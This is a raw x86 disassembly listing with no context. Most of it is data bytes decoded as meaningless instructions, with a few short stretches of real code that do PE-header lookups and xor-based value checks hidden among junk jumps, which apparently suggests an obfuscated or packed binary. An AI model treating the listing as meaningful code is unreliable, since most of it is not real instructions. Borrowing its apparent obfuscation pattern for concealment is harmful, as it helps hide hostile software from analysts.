  40f21c:	sub    dh,bh
  40f21e:	push   ebp
  40f21f:	shr    bh,0x0
  40f222:	icebp  
  40f223:	dec    esi
  40f224:	scas   al,BYTE PTR es:[edi]
  40f225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f226:	data16 adc dl,BYTE PTR [ecx+0x68d9829c]
  40f22d:	out    0x3,eax
  40f22f:	int    0x44
  40f231:	mov    cl,0x6b
  40f233:	sbb    al,0x21
  40f235:	add    al,0xc9
  40f237:	mov    ch,0x37
  40f239:	adc    BYTE PTR fs:[ecx],bl
  40f23c:	and    BYTE PTR [ecx],ah
  40f23e:	xchg   DWORD PTR [esi-0x77ae2ff6],ecx
  40f244:	ja     0x40f1df
  40f246:	adc    al,0xdb
  40f248:	jmp    0x13f7dae3
  40f24d:	and    bh,BYTE PTR [edi]
  40f24f:	mov    BYTE PTR [edi-0x785b089a],ah
  40f255:	sub    BYTE PTR [ebx+0x3a],ah
  40f258:	and    al,0xbb
  40f25a:	mov    ds:0x1e8c41b7,al
  40f25f:	or     BYTE PTR [esi+edx*4-0xbaad47a],dl
  40f266:	imul   edi,DWORD PTR [edi-0x57],0xffffffe2
  40f26a:	add    esp,DWORD PTR [ebx-0x6d]
  40f26d:	adc    al,0xbd
  40f26f:	or     ch,BYTE PTR [ecx-0x4a649ced]
  40f275:	fiadd  DWORD PTR [edx+0x4a5b898b]
  40f27b:	pop    edx
  40f27c:	ss push 0x4c
  40f27f:	repnz retf 
  40f281:	imul   DWORD PTR [ecx]
  40f283:	jmp    0xbd24080b
  40f288:	pop    DWORD PTR [eax+edx*4-0x58]
  40f28c:	xchg   ebp,eax
  40f28d:	push   ebp
  40f28e:	inc    eax
  40f28f:	cmp    ecx,DWORD PTR [ebx]
  40f291:	mov    ebp,DWORD PTR [ecx]
  40f293:	iret   
  40f294:	or     eax,eax
  40f296:	jo     0x40f2ea
  40f298:	in     eax,dx
  40f299:	mov    al,ds:0xd6939b03
  40f29e:	(bad)  [ebx]
  40f2a0:	fwait
  40f2a1:	dec    edi
  40f2a2:	js     0x40f28a
  40f2a4:	test   BYTE PTR [ecx-0x28de8d02],bl
  40f2aa:	test   BYTE PTR [ebx+0x6923484],0x18
  40f2b1:	out    0xe3,al
  40f2b3:	jge    0x40f261
  40f2b5:	cmc    
  40f2b6:	(bad)  
  40f2b7:	(bad)  
  40f2b8:	bnd js 0x40f27f
  40f2bb:	xor    eax,0xed3a200c
  40f2c0:	inc    edx
  40f2c1:	ss jbe 0x40f2bc
  40f2c4:	or     DWORD PTR [eax+0x1e8900c7],edx
  40f2ca:	xor    al,0x60
  40f2cc:	jmp    0x40f7b6
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	ror    BYTE PTR [eax+0x0],1
  40f2f9:	xchg   esi,eax
  40f2fa:	test   DWORD PTR [esi-0x57],esi
  40f2fd:	jo     0x40f36f
  40f2ff:	ret    
  40f300:	jg     0x40f372
  40f302:	jo     0x40f31a
  40f304:	sub    DWORD PTR [edx],ecx
  40f306:	test   BYTE PTR ds:0x32dffb08,al
  40f30c:	sar    ch,1
  40f30e:	and    DWORD PTR [eax],ebx
  40f310:	cli    
  40f311:	rcl    BYTE PTR [ebp-0x16],0xf7
  40f315:	fwait
  40f316:	aaa    
  40f317:	jl     0x40f377
  40f319:	mov    WORD PTR [eax+0x1d],es
  40f31c:	xchg   esi,eax
  40f31d:	jge    0x40f2ba
  40f31f:	pop    edi
  40f320:	in     eax,dx
  40f321:	sub    dl,ah
  40f323:	in     eax,0x39
  40f325:	mov    ds:0x66fc840b,al
  40f32a:	add    BYTE PTR [edx-0x6af2dea4],ch
  40f330:	mov    bl,0x51
  40f332:	neg    DWORD PTR [esi+ebx*4+0x4559dc24]
  40f339:	ror    BYTE PTR [ebp-0x4e],1
  40f33c:	rcl    BYTE PTR [esi+eiz*1-0x7832679f],0x42
  40f344:	ja     0x40f364
  40f346:	push   cs
  40f347:	loop   0x40f34b
  40f349:	clc    
  40f34a:	jle    0x40f32e
  40f34c:	inc    ebp
  40f34d:	call   0x806e:0x3a79bf43
  40f354:	shl    BYTE PTR [eax+0x3d],cl
  40f357:	inc    eax
  40f358:	ror    DWORD PTR [eax-0x25b9b883],1
  40f35e:	test   eax,0xf3522a77
  40f363:	jmp    0x3f1b:0x7cade62d
  40f36a:	rol    DWORD PTR [esi],cl
  40f36c:	inc    ebp
  40f36d:	test   eax,0xa271bf30
  40f372:	das    
  40f373:	pop    ecx
  40f374:	pop    esp
  40f375:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f376:	or     BYTE PTR [edi-0xd],dl
  40f379:	ficom  DWORD PTR [ebx]
  40f37b:	loop   0x40f3be
  40f37d:	xchg   ecx,eax
  40f37e:	push   edi
  40f37f:	outs   dx,DWORD PTR ds:[esi]
  40f380:	push   esp
  40f381:	adc    BYTE PTR [ebx],cl
  40f383:	xchg   ebx,eax
  40f384:	xsaves ds:0x2cdedfd3
  40f38b:	inc    ebp
  40f38c:	loope  0x40f3a1
  40f38e:	push   eax
  40f38f:	fstp   QWORD PTR [ebx+ebp*8+0x4d97a32f]
  40f396:	out    0x18,eax
  40f398:	or     dh,BYTE PTR [edx-0x6e3f18a7]
  40f39e:	xchg   esi,eax
  40f39f:	ins    DWORD PTR es:[edi],dx
  40f3a0:	and    eax,0xfa3bc3cc
  40f3a5:	or     al,0x1b
  40f3a7:	cmp    edi,DWORD PTR [edi-0xa0c2b23]
  40f3ad:	push   esi
  40f3ae:	loop   0x40f427
  40f3b0:	push   0x44af84c3
  40f3b5:	lods   al,BYTE PTR ds:[esi]
  40f3b6:	push   ss
  40f3b7:	les    ecx,FWORD PTR [edx]
  40f3b9:	inc    edx
  40f3ba:	lahf   
  40f3bb:	imul   esi,DWORD PTR [edi-0x35c05aa9],0x166f20ab
  40f3c5:	hlt    
  40f3c6:	int    0x1e
  40f3c8:	(bad)  
  40f3c9:	jl     0x40f389
  40f3cb:	mov    ebx,0x260a5594
  40f3d0:	xchg   edx,eax
  40f3d1:	cmp    eax,DWORD PTR [edi-0x76]
  40f3d4:	xchg   al,bl
  40f3d6:	jo     0x40f3d1
  40f3d8:	xchg   ecx,eax
  40f3d9:	sub    dh,dh
  40f3db:	sbb    ebp,edi
  40f3dd:	mov    ds:0x49c226f8,al
  40f3e2:	rcl    DWORD PTR [edx+0x62],0x4b
  40f3e6:	cmp    eax,0x4f20189a
  40f3eb:	retf   0x9bc
  40f3ee:	mov    bh,0xfa
  40f3f0:	pop    esi
  40f3f1:	xor    BYTE PTR [edx-0x5d1f90b4],ch
  40f3f7:	add    cl,ah
  40f3f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3fa:	(bad)  
  40f3fb:	retf   0xd12e
  40f3fe:	(bad)  [ecx-0x15608b79]
  40f404:	scas   eax,DWORD PTR es:[edi]
  40f405:	cmp    ecx,DWORD PTR [esi-0x14]
  40f408:	push   ecx
  40f409:	scas   al,BYTE PTR es:[edi]
  40f40a:	int3   
  40f40b:	mov    dh,0x49
  40f40d:	and    DWORD PTR [ebx-0x4729f0aa],0xffffff82
  40f414:	xchg   BYTE PTR [ebp-0x20],dh
  40f417:	call   0x26085e2d
  40f41c:	in     al,0xb5
  40f41e:	cmp    ebp,DWORD PTR ds:0x125b25bb
  40f424:	add    BYTE PTR [edx-0x71],bh
  40f427:	jecxz  0x40f3b6
  40f429:	mov    eax,ds:0xd6b87ac2
  40f42e:	hlt    
  40f42f:	nop
  40f430:	imul   esp,DWORD PTR [esi+0x51da80b6],0x81efc8d0
  40f43a:	test   al,0xf6
  40f43c:	dec    eax
  40f43d:	cld    
  40f43e:	jmp    0x40f477
  40f440:	or     esp,DWORD PTR [edx+edi*8]
  40f443:	int3   
  40f444:	mov    ah,0xc0
  40f446:	inc    edi
  40f447:	mov    es,WORD PTR [esi+0x79]
  40f44a:	adc    al,0xc8
  40f44c:	ins    BYTE PTR es:[edi],dx
  40f44d:	mov    ecx,0x458be9b0
  40f452:	clc    
  40f453:	jmp    0x40f5bd
  40f458:	inc    eax
  40f459:	gs ror ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	fimul  WORD PTR [edi+edx*8+0x70b7399f]
  40f46b:	jo     0x40f430
  40f46d:	jg     0x40f4df
  40f46f:	jo     0x40f4d9
  40f471:	inc    ebx
  40f472:	xchg   ebx,eax
  40f473:	inc    esp
  40f474:	repz (bad) 
  40f477:	inc    esi
  40f478:	and    BYTE PTR [esi],0xfd
  40f47b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f47c:	aad    0x1b
  40f47e:	pop    esp
  40f47f:	shl    DWORD PTR [ecx],0x98
  40f482:	sahf   
  40f483:	loop   0x40f4fb
  40f485:	imul   esi,esi,0x1e
  40f488:	mov    ch,0x3d
  40f48a:	mov    gs,WORD PTR [ebp-0x4c]
  40f48d:	imul   ecx,DWORD PTR [eax],0x389bae1d
  40f493:	icebp  
  40f494:	cli    
  40f495:	adc    BYTE PTR [eax-0x29],ch
  40f498:	(bad)  
  40f499:	ficomp WORD PTR [ecx]
  40f49b:	sub    DWORD PTR [edx],edi
  40f49d:	xchg   esp,eax
  40f49e:	js     0x40f4d0
  40f4a0:	ret    
  40f4a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4a2:	pop    ebp
  40f4a3:	mov    al,ds:0x8bfbf288
  40f4a8:	scas   eax,DWORD PTR es:[edi]
  40f4a9:	pushf  
  40f4aa:	xor    bl,al
  40f4ac:	mov    WORD PTR [esi+edi*8-0x21],?
  40f4b0:	push   ebx
  40f4b1:	sub    al,bl
  40f4b3:	mov    bl,0x12
  40f4b5:	ja     0x40f4da
  40f4b7:	mov    ecx,0xf9e8a5f6
  40f4bc:	mov    edx,eax
  40f4be:	mov    BYTE PTR [edi+0x65901e7a],dh
  40f4c4:	mov    bl,dl
  40f4c6:	or     al,0x84
  40f4c8:	add    bl,0x7f
  40f4cb:	mov    dh,0x0
  40f4cd:	adc    ebx,esi
  40f4cf:	and    bl,ah
  40f4d1:	int3   
  40f4d2:	add    esi,esp
  40f4d4:	push   0x6
  40f4d6:	xchg   ecx,edi
  40f4d8:	sub    DWORD PTR [eax-0x64],0x2d484629
  40f4df:	sbb    eax,DWORD PTR [ecx+ebx*8-0x7eb8c9b7]
  40f4e6:	rcpps  xmm2,XMMWORD PTR cs:[esi]
  40f4ea:	jbe    0x40f565
  40f4ec:	ss pop esi
  40f4ee:	cmp    ebx,DWORD PTR [ebx+0x4e]
  40f4f1:	outs   dx,DWORD PTR ds:[esi]
  40f4f2:	call   0xf476a6b8
  40f4f7:	out    dx,al
  40f4f8:	ss (bad) 
  40f4fb:	repnz cmp eax,0x44aaa059
  40f501:	cmp    BYTE PTR [eax],cl
  40f503:	inc    esp
  40f504:	mov    ds:0xbcd9bf8d,eax
  40f509:	out    dx,eax
  40f50a:	xor    DWORD PTR [ebx],esp
  40f50c:	lock push edi
  40f50e:	scas   al,BYTE PTR es:[edi]
  40f50f:	sbb    cl,BYTE PTR ds:0xdf126c04
  40f515:	dec    esi
  40f516:	int3   
  40f517:	pop    es
  40f518:	and    DWORD PTR [edi],ecx
  40f51a:	pop    edx
  40f51b:	push   cs
  40f51c:	cmp    esi,DWORD PTR [ecx-0x2b086bfc]
  40f522:	rol    BYTE PTR [esi],1
  40f524:	dec    esi
  40f525:	mov    ds:0x6edec9c,eax
  40f52a:	jns    0x40f5a3
  40f52c:	(bad)  
  40f52d:	(bad)
  40f531:	mov    ds:0x598c0a43,eax
  40f536:	and    al,0x51
  40f538:	cmp    BYTE PTR [ecx+0x5e],0x4e
  40f53c:	mov    ebx,0x309ff9be
  40f541:	aaa    
  40f542:	clc    
  40f543:	rcr    ebx,cl
  40f545:	mov    ss,WORD PTR [eax+0x2c]
  40f548:	jns    0x40f4ef
  40f54a:	adc    bl,bl
  40f54c:	js     0x40f5b5
  40f54e:	or     eax,0x8c5e33a3
  40f553:	pop    esi
  40f554:	scas   al,BYTE PTR es:[edi]
  40f555:	add    ecx,DWORD PTR [eax-0x15]
  40f558:	sub    al,0xae
  40f55a:	inc    edx
  40f55b:	push   es
  40f55c:	inc    ebp
  40f55d:	mov    ?,WORD PTR [edi]
  40f55f:	jbe    0x40f5b8
  40f561:	cmc    
  40f562:	adc    DWORD PTR [ecx],edi
  40f564:	hlt    
  40f565:	inc    edi
  40f566:	inc    edx
  40f567:	js     0x40f4ea
  40f569:	sbb    edi,edx
  40f56b:	lods   al,BYTE PTR ds:[esi]
  40f56c:	xor    eax,0x33fd8ee7
  40f571:	stos   DWORD PTR es:[edi],eax
  40f572:	out    0xbe,eax
  40f574:	ja     0x40f580
  40f576:	mov    eax,ds:0x7001ae8f
  40f57b:	sub    al,0x51
  40f57d:	in     al,dx
  40f57e:	pop    ecx
  40f57f:	(bad)  [ecx]
  40f581:	adc    BYTE PTR [ecx+0x43],0xf2
  40f585:	dec    esp
  40f586:	sub    BYTE PTR ds:0x53aaa60,0x2c
  40f58d:	idiv   DWORD PTR [esi+eiz*1]
  40f590:	push   ebx
  40f591:	xchg   esi,eax
  40f592:	and    eax,eax
  40f594:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f595:	jge    0x40f5c9
  40f597:	xchg   DWORD PTR [esi],edi
  40f599:	pop    eax
  40f59a:	ds inc ebx
  40f59c:	jno    0x40f545
  40f59e:	dec    edx
  40f59f:	cmp    DWORD PTR [ebx],esp
  40f5a1:	js     0x40f5db
  40f5a3:	out    0xfb,al
  40f5a5:	pop    ebp
  40f5a6:	jp     0x40f5e6
  40f5a8:	enter  0x729,0x2d
  40f5ac:	inc    edx
  40f5ad:	arpl   dx,di
  40f5af:	outs   dx,BYTE PTR ds:[esi]
  40f5b0:	into   
  40f5b1:	std    
  40f5b2:	and    eax,0xe45ef519
  40f5b7:	stos   BYTE PTR es:[edi],al
  40f5b8:	in     al,dx
  40f5b9:	mov    BYTE PTR [edx+ebp*4],dh
  40f5bc:	mov    eax,DWORD PTR cs:[eax]
  40f5bf:	mov    eax,DWORD PTR [eax+0x3c]
  40f5c2:	lea    ecx,[ecx*8+0x78]
  40f5c9:	add    eax,ecx
  40f5cb:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5ce:	mov    ecx,DWORD PTR [ecx]
  40f5d0:	mov    eax,DWORD PTR [eax+ecx*1]
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	jl     0x40f63b
  40f605:	jmp    0xc370:0x70b68c11
  40f60c:	jg     0x40f67e
  40f60e:	jo     0x40f5fb
  40f610:	push   ebp
  40f611:	stc    
  40f612:	lahf   
  40f613:	inc    eax
  40f614:	fldenv [ecx-0x229187ee]
  40f61a:	xor    al,0x42
  40f61c:	pop    ss
  40f61d:	clc    
  40f61e:	ret    0xdc10
  40f621:	xchg   esi,eax
  40f622:	(bad)  
  40f623:	xchg   ebx,eax
  40f624:	pop    esp
  40f625:	inc    esp
  40f626:	shr    DWORD PTR [ebp+0x5c],cl
  40f629:	lods   eax,DWORD PTR ds:[esi]
  40f62a:	outs   dx,BYTE PTR ds:[esi]
  40f62b:	mov    al,ds:0x55991095
  40f630:	mov    bl,0xc3
  40f632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f633:	mov    cs,esp
  40f635:	into   
  40f636:	in     al,0x40
  40f638:	adc    BYTE PTR ds:0x3b424faf,cl
  40f63e:	dec    eax
  40f63f:	pop    esi
  40f640:	push   es
  40f641:	mov    ebp,0x243d4dfb
  40f646:	out    dx,eax
  40f647:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f648:	fs push edx
  40f64a:	fldenv [edi-0x17035472]
  40f650:	xchg   ebp,eax
  40f651:	pop    ss
  40f652:	ret    0x37b
  40f655:	or     BYTE PTR [edx+0x71cc65ed],dl
  40f65b:	fiadd  DWORD PTR [edx]
  40f65d:	mov    ch,bl
  40f65f:	mov    ah,0x4e
  40f661:	aas    
  40f662:	aad    0xed
  40f664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f665:	xor    eax,0xf566b3df
  40f66a:	or     eax,0x87449204
  40f66f:	fwait
  40f670:	in     al,0x5e
  40f672:	cld    
  40f673:	es ds daa 
  40f676:	imul   edx,eax,0x908769fd
  40f67c:	jmp    0x40f66a
  40f67e:	lock cdq 
  40f680:	xchg   DWORD PTR ds:0xb40f3c62,eax
  40f686:	xchg   BYTE PTR [ebp+0x6c02ac16],cl
  40f68c:	xchg   esp,eax
  40f68d:	fdiv   DWORD PTR [edx+0x7436ae06]
  40f693:	jb     0x40f6f1
  40f695:	icebp  
  40f696:	add    eax,0xe24cde3b
  40f69b:	sahf   
  40f69c:	sub    DWORD PTR [edx],esp
  40f69e:	push   0x5dce99fe
  40f6a3:	leave  
  40f6a4:	or     DWORD PTR [eax+esi*8],ebp
  40f6a7:	test   BYTE PTR [edi],al
  40f6a9:	add    al,0x9e
  40f6ab:	pop    ds
  40f6ac:	aad    0x8a
  40f6ae:	sti    
  40f6af:	push   0x65
  40f6b1:	loopne 0x40f65d
  40f6b3:	jecxz  0x40f6b5
  40f6b5:	outs   dx,DWORD PTR ds:[esi]
  40f6b6:	test   BYTE PTR [ebx+ecx*4+0x4],ch
  40f6ba:	adc    al,0xd6
  40f6bc:	cmp    DWORD PTR [ebp+0x4d4607e6],ebx
  40f6c2:	pop    edx
  40f6c3:	cmc    
  40f6c4:	(bad)  
  40f6c5:	jne    0x40f69c
  40f6c7:	mov    dl,0xe6
  40f6c9:	mul    BYTE PTR [edi]
  40f6cb:	enter  0x7983,0xa6
  40f6cf:	mov    edx,0xf3f28667
  40f6d4:	gs dec ebx
  40f6d6:	xchg   edi,eax
  40f6d7:	enter  0x2b06,0x3b
  40f6db:	jl     0x40f67f
  40f6dd:	ficomp DWORD PTR [ecx+edi*8-0x30]
  40f6e1:	bound  esp,QWORD PTR [ecx-0x2e]
  40f6e4:	jmp    0x40f6f7
  40f6e6:	fistp  QWORD PTR [esi+edi*4+0x4e4361e]
  40f6ed:	aad    0xfd
  40f6ef:	xchg   ecx,eax
  40f6f0:	stos   DWORD PTR es:[edi],eax
  40f6f1:	add    esi,ebp
  40f6f3:	je     0x40f6e2
  40f6f5:	and    ah,BYTE PTR [edx+0xd]
  40f6f8:	mov    ds:0xe61b8d53,eax
  40f6fd:	js     0x40f69b
  40f6ff:	lods   eax,DWORD PTR ds:[esi]
  40f700:	mov    dh,0xf7
  40f702:	cmp    esi,DWORD PTR [eax+edx*8]
  40f705:	shl    BYTE PTR [eax],cl
  40f707:	lahf   
  40f708:	mov    ebp,0x708cd6b4
  40f70d:	cmp    ch,bh
  40f70f:	test   DWORD PTR [edi+ecx*8],esp
  40f712:	dec    ecx
  40f713:	gs push esp
  40f715:	pop    edi
  40f716:	icebp  
  40f717:	lods   eax,DWORD PTR ds:[esi]
  40f718:	retf   
  40f719:	push   esp
  40f71a:	fs cdq 
  40f71c:	sbb    esi,DWORD PTR [edx]
  40f71e:	or     eax,ebx
  40f720:	(bad)  
  40f721:	call   0x43b06577
  40f726:	inc    ebx
  40f727:	mov    esp,0xf3febd57
  40f72c:	adc    eax,0x9e294f41
  40f731:	adc    BYTE PTR [esi-0x13f39d42],ch
  40f737:	pop    eax
  40f738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f739:	push   es
  40f73a:	inc    eax
  40f73b:	add    ebx,edi
  40f73d:	inc    ebp
  40f73e:	push   ebp
  40f73f:	mov    esp,0xc9837dc9
  40f744:	or     ebx,esp
  40f746:	mov    bl,0xf2
  40f748:	repz dec edi
  40f74a:	setno  BYTE PTR [esi+0x7b245403]
  40f751:	(bad)  
  40f753:	repz enter 0xbf5f,0xf5
  40f758:	cmp    eax,0x8bfe404e
  40f75d:	inc    ebp
  40f75e:	clc    
  40f75f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f762:	add    ecx,DWORD PTR [eax]
  40f764:	mov    DWORD PTR [ebp-0x24],ecx
  40f767:	mov    eax,DWORD PTR [ebp-0x24]
  40f76a:	mov    ecx,DWORD PTR [ebp-0x8]
  40f76d:	mov    eax,DWORD PTR [eax+0xc]
  40f770:	mov    ecx,DWORD PTR [ecx]
  40f772:	mov    al,BYTE PTR [eax+ecx*1]
  40f775:	add    al,0x37
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0x9c6946f3
  40f7e3:	ror    BYTE PTR ds:0x7070b55f,0xa3
  40f7ea:	jge    0x40f85c
  40f7ec:	jo     0x40f7ac
  40f7ee:	sbb    al,0xf5
  40f7f0:	fwait
  40f7f1:	lahf   
  40f7f2:	js     0x40f77e
  40f7f4:	add    al,0x1b
  40f7f6:	or     DWORD PTR ds:0x9e27eb0b,0xfc04bcc3
  40f800:	mov    esi,0x80721d1d
  40f805:	je     0x40f82a
  40f807:	xor    BYTE PTR [esi],al
  40f809:	mov    esi,edx
  40f80b:	xchg   esp,eax
  40f80c:	mov    eax,0xc2411e82
  40f811:	inc    esp
  40f812:	test   al,0x66
  40f814:	mov    cl,bl
  40f816:	sub    ecx,DWORD PTR [esi-0xb]
  40f819:	mov    eax,ds:0x4aa9e416
  40f81e:	inc    edx
  40f81f:	cdq    
  40f820:	pushf  
  40f821:	(bad)  
  40f823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f824:	sub    DWORD PTR [esi],edx
  40f826:	dec    ebx
  40f827:	leave  
  40f828:	cs jge 0x40f8a0
  40f82b:	add    DWORD PTR [ebp+0x1b01d07b],ebx
  40f831:	mov    edi,0x2442adf1
  40f836:	ins    BYTE PTR es:[edi],dx
  40f837:	add    esp,0x3a7635bf
  40f83d:	xchg   esi,eax
  40f83e:	xchg   DWORD PTR [ecx-0x5334d7fa],esi
  40f844:	(bad)  
  40f845:	iret   
  40f846:	sti    
  40f847:	mov    al,0x8b
  40f849:	sbb    cl,BYTE PTR [esi-0x2b]
  40f84c:	push   ss
  40f84d:	lds    esi,FWORD PTR [edx+0x4]
  40f850:	in     al,dx
  40f851:	pushf  
  40f852:	pop    es
  40f853:	daa    
  40f854:	gs sub eax,0xa0e5357c
  40f85a:	adc    esi,DWORD PTR ds:[edi+0x77]
  40f85e:	sbb    al,0x35
  40f860:	cmp    ah,dh
  40f862:	cmp    dl,bl
  40f864:	aas    
  40f865:	push   0xffffff9f
  40f867:	pop    ebp
  40f868:	sub    BYTE PTR [edi],0xd
  40f86b:	add    al,0x1d
  40f86d:	fdivr  QWORD PTR [eax]
  40f86f:	mov    dl,0x9d
  40f871:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f872:	bound  edi,QWORD PTR [edi-0x5d]
  40f875:	pop    es
  40f876:	(bad)
  40f879:	fbstp  TBYTE PTR [ebx+0x35]
  40f87c:	(bad)  
  40f87d:	out    dx,al
  40f87e:	adc    bx,WORD PTR [edx]
  40f881:	aaa    
  40f882:	fmul   QWORD PTR [ebx]
  40f884:	pop    esi
  40f885:	in     eax,0xcd
  40f887:	mov    bl,0x82
  40f889:	inc    ecx
  40f88a:	add    esp,ebx
  40f88c:	outs   dx,BYTE PTR ds:[esi]
  40f88d:	test   eax,0xd4bc3f7e
  40f892:	dec    ebp
  40f893:	out    0x4b,al
  40f895:	out    dx,al
  40f896:	stc    
  40f897:	add    DWORD PTR [ebx+0x60],ecx
  40f89a:	stc    
  40f89b:	mov    cl,0x4
  40f89d:	jo     0x40f829
  40f89f:	xchg   ebp,eax
  40f8a0:	sub    eax,0x3c169b47
  40f8a5:	(bad)  
  40f8a6:	lahf   
  40f8a7:	xchg   DWORD PTR [ebx-0xee1dffb],edi
  40f8ad:	jbe    0x40f854
  40f8af:	call   0xd5e3f60a
  40f8b4:	mov    ah,0xb8
  40f8b6:	je     0x40f858
  40f8b8:	scas   al,BYTE PTR es:[edi]
  40f8b9:	cmc    
  40f8ba:	mov    esi,0xe031bb06
  40f8bf:	loop   0x40f8d9
  40f8c1:	jns    0x40f926
  40f8c3:	xlat   BYTE PTR ds:[ebx]
  40f8c4:	loop   0x40f886
  40f8c6:	enter  0xc9a5,0x9e
  40f8ca:	mov    ebx,0x19126989
  40f8cf:	daa    
  40f8d0:	les    ecx,FWORD PTR [ecx]
  40f8d2:	lods   eax,DWORD PTR ds:[esi]
  40f8d3:	mov    eax,ds:0xb4763275
  40f8d8:	lea    eax,[ebx]
  40f8da:	push   ebp
  40f8db:	dec    edi
  40f8dc:	xor    esi,esi
  40f8de:	fimul  WORD PTR [ecx]
  40f8e0:	add    al,0x91
  40f8e2:	outs   dx,DWORD PTR ds:[esi]
  40f8e3:	sbb    edx,edx
  40f8e5:	(bad)  
  40f8e6:	outs   dx,DWORD PTR ds:[esi]
  40f8e7:	pop    es
  40f8e8:	dec    ebp
  40f8e9:	pop    edx
  40f8ea:	xor    cl,dh
  40f8ec:	sbb    eax,0x92152c96
  40f8f1:	imul   ecx,DWORD PTR [ebx+0x6540d747],0xffffffbc
  40f8f8:	daa    
  40f8f9:	pop    esi
  40f8fa:	mov    edi,0xef859003
  40f8ff:	cmc    
  40f900:	cmp    al,0xca
  40f902:	mov    ebx,0x4ead40f9
  40f907:	xchg   edi,eax
  40f908:	cmp    al,0xb4
  40f90a:	out    0x12,eax
  40f90c:	mov    bl,al
  40f90e:	jecxz  0x40f922
  40f910:	rcl    esi,cl
  40f912:	jns    0x40f8e1
  40f914:	sbb    cl,BYTE PTR [edx-0x5d]
  40f917:	cwde   
  40f918:	push   edi
  40f919:	mov    edi,0x863aab4e
  40f91e:	mov    ds:0xa79b5433,al
  40f923:	jmp    0x15085302
  40f928:	mov    ds:0xb5107152,al
  40f92d:	das    
  40f92e:	mov    al,0x63
  40f930:	adc    DWORD PTR [eax+0x1483783],ebx
  40f936:	stc    
  40f937:	push   ds
  40f938:	(bad)  
  40f93a:	pop    ss
  40f93b:	out    0xf9,eax
  40f93d:	inc    edx
  40f93e:	popf   
  40f93f:	mov    bl,0xa3
  40f941:	add    ecx,DWORD PTR [eax+0x79]
  40f944:	pop    eax
  40f945:	pop    ebp
  40f946:	call   0x43370d3a
  40f94b:	pop    edi
  40f94c:	scas   al,BYTE PTR es:[edi]
  40f94d:	call   0x414c:0xd4fd8c2b
  40f954:	and    ecx,DWORD PTR [edi+ecx*1]
  40f957:	stos   DWORD PTR es:[edi],eax
  40f958:	push   esi
  40f959:	or     eax,0xfe6fe86b
  40f95e:	mov    cl,0xba
  40f960:	cmp    eax,0x258d2a0
  40f965:	cmp    al,BYTE PTR [edi]
  40f967:	push   esp
  40f968:	and    BYTE PTR [edi],al
  40f96a:	jb     0x40f987
  40f96c:	inc    edx
  40f96d:	push   ebp
  40f96e:	adc    eax,0xfd44afbf
  40f973:	repz dec esi
  40f975:	sub    al,0x5e
  40f977:	iret   
  40f978:	cs (bad) 
  40f97a:	xor    bh,BYTE PTR [esi+0x3e]
